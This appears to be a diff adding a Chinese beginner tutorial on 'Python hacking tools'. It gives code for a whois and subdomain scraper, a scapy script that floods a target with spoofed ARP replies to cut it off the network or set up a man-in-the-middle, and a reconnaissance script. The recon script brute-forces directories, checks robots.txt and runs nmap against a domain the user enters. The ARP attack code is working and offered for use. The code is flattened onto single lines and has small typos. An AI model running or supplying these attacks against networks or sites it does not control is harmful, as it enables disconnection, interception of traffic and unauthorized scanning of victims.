@@ -1,0 +1,51 @@
+新手Python黑客工具入门
+前言
+为了满足新手对Python的追求，特写了三个初级Python入门工具。第一期写了三个初级工具，希望新手看完以后可以对Python的脚本有一个基本了解。高手请绕过此文章！
+一件套：pythond requests模块，构造一个whois信息收集器； 二件套：Python编写一个arp断网攻击； 三件套：目录信息收集。
+一件套前言： 带给想写项目但无从下手的朋友们，这些脚本都比较容易理解
+简单梳理一下此工具需要具备哪些功能。脚本获取信息如下：
+IP信息 子域名 备案 注册人 邮箱 地址 电话 DNS
+具体操作如下：
+我们要用到的模块是requests
+python环境：py3
+安装方法：
+pip install requests或python steup.py install
+通过http://site.ip138.com来进行查询
+http://site.ip138.com/输入你要查询的域名/domain.html #这个目录用于查询IP解析记录
+htp://site.ip138.com/输入你要查询的域名/beian.html #这个用于查询子域名
+http://site.ip138.com/输入你要查询的域名/whois.html #这个用于进行whois查询
+好了现在我们开始构造我们的代码，代码里面有详细的注释
+import requests import time from bs4 import BeautifulSoup strat=time.time() def chax () : lid=input( ' 请输入你要查询的域名 :' ) head={ 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36' } url= "http://site.ip138.com/{}/" .format(lid) urldomain= "http://site.ip138.com/{}/domain.htm" .format(lid) url2= "http://site.ip138.com/{}/beian.htm" .format(lid) url3= "http://site.ip138.com/{}/whois.htm" .format(lid) rb=requests.get(url,headers=head) rb1=requests.get(urldomain,headers=head) rb2=requests.get(url2,headers=head) rb3=requests.get(url3,headers=head) gf=BeautifulSoup(rb.content, 'html.parser' ) print( '[+]IP 解析记录 ' ) for x in gf.find_all( 'p' ): link=x.get_text() print(link) gf1=BeautifulSoup(rb1.content, 'html.parser' ) print( '[+] 子域名查询 ' ) for v in gf1.find_all( 'p' ): link2=v.get_text() print(link2) gf2=BeautifulSoup(rb2.content, 'html.parser' ) print( '[+] 备案查询 ' ) for s in gf2.find_all( 'p' ): link3=s.get_text() print(link3) gf3=BeautifulSoup(rb3.content, 'html.parser' ) print( '[+]whois 查询 ' ) for k in gf3.find_all( 'p' ): link4=k.get_text() print(link4) chax() end=time.time() print( ' 查询耗时 :' ,end-strat)
+二件套： 使用python编写一个arp断网攻击
+你们知道arp攻击的原理吗？如果不知道不要紧，下面开始介绍
+arp攻击原理：
+通过伪造IP地址与MAC地址实现ARP欺骗，在网络发送大量ARP通信量。攻击者只要持续不断发送arp包就能造成中间人攻击或者断网攻击。（PS:我们只需要scapy里的一些参数就可以实现）
+scapy介绍：
+Scapy是一个Python程序，使用户能够发送，嗅探和剖析和伪造网络数据包。此功能允许构建可以探测，扫描或攻击网络的工具。
+换句话说，Scapy是一个功能强大的交互式数据包处理程序。它能够伪造或解码大量协议的数据包，在线上发送，捕获，匹配请求和回复等等。Scapy可以轻松处理大多数经典任务，如扫描，追踪，探测，单元测试，攻击或网络发现。它可以替代hping，arpspoof，arp-sk，arping，pf，甚至是Nmap，tcpdump和tshark的某些部分。scapy的一个小例子:
+ps:scapy正确的食用手册请认真看完介绍和部分基础：【传送门】
+安装scapy：
+py2安装方法：
+pip install scapy
+py3安装方法：
+pip install scapy3
+更多的安装方法：【传送门】
+我的系统环境是:Kali Linux下
+各位读者可以考虑一些使用以下系统环境：
+Centos
+Ubuntu
+Mac os
+ps：尽量不要使用windows，windows会报错！
+缺少windows.dll，具体这个dll安装后会不会又报错官方没给出答复
+编写攻击的脚本： Ether是构造网络数据包 ARP进行ARP攻击 sendp进行发包
+import os import sys from scapy.layers.l2 import getmacbyip from scapy.all import ( Ether, ARP, sendp ) ifconfig=os.system( 'ifconfig' ) print ifconfig gmac=raw_input( 'Please enter gateway IP:' ) liusheng=raw_input( 'Please enter your IP:' ) liusrc=raw_input( 'Please enter target IP:' ) try : tg=getmacbyip(liusrc) print tg except Exception , f: print '[-]{}' .format(f) exit() def arpspoof () : try : eth=Ether() arp=ARP( op= "is-at" , hwsrc=gmac, psrc=liusheng, hwdst=tg, pdst=liusrc ) print ((eth/arp).show()) sendp(eth/arp,inter= 2 ,loop= 1 ) except Exception ,g: print '[-]{}' .format(g) exit() arpspoof()
+从受害者角度看
+三件套： 想要挖web漏洞就必须做好前面的信息收集
+下面我们来写一个收集信息的脚本。
+准备：
+安装好requests,bs4模块: pip install requests pip install bs4 或者去下载好对应的模块压缩包 然后找到steup.py执行python steup.py install
+思路： 使用requests.headers()获取http头部信息 通过htp响应码来判断robots是否存在 通过http响应码判断存在的目录 通过nmap判断开放的端口(PS:这里我是使用os模块来进行nmap命令扫描)我这边的nmap模块一调用，nmap就会出现停止运行 通过爬取某网站获得对应的whois,IP反查域名的信息。
+开始：
+import requests import os import socket from bs4 import BeautifulSoup import time def Webfingerprintcollection () : global lgr lgr=input( ' 请输入目标域名： ' ) url= "http://{}" .format(lgr) header={ 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36' } r=requests.get(url,headers=header) xyt=r.headers for key in xyt: print(key, ':' ,xyt[key]) Webfingerprintcollection() print( '================================================' ) def robots () : urlsd= "http://{}/robots.txt" .format(lgr) header = { 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36' } gf=requests.get(urlsd,headers=header,timeout= 8 ) if gf.status_code == 200 : print( 'robots.txt 存在 ' ) print( '[+] 该站存在 robots.txt' ,urlsd) else : print( '[-] 没有 robots.txt' ) robots() print( "=================================================" ) def Webdirectoryscanner () : dict=open( 'build.txt' , 'r' ,encoding= 'utf-8' ).read().split( '
+' ) for xyt in dict: try : header = { 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36' } urljc= "http://" +lgr+ "{}" .format(xyt) rvc=requests.get(urljc,headers=header,timeout= 8 ) if rvc.status_code == 200 : print( '[*]' ,urljc) except : print( '[-] 远程主机强迫关闭了一个现有的连接 ' ) Webdirectoryscanner() print( "=====================================================" ) s = socket.gethostbyname(lgr) def portscanner () : o=os.system( 'nmap {} program' .format(s)) print(o) portscanner() print( '======================================================' ) def whois () : heads={ 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36' } urlwhois= "http://site.ip138.com/{}/whois.htm" .format(lgr) rvt=requests.get(urlwhois,headers=heads) bv=BeautifulSoup(rvt.content, "html.parser" ) for line in bv.find_all( 'p' ): link=line.get_text() print(link) whois() print( '======================================================' ) def IPbackupdomainname () : wu=socket.gethostbyname(lgr) rks= "http://site.ip138.com/{}/" .format(wu) rod={ 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36' } sjk=requests.get(rks,headers=rod) liverou=BeautifulSoup(sjk.content, 'html.parser' ) for low in liverou.find_all( 'li' ): bc=low.get_text() print(bc) IPbackupdomainname() print( '=======================================================' )
+三件套下载地址Github：【传送门】
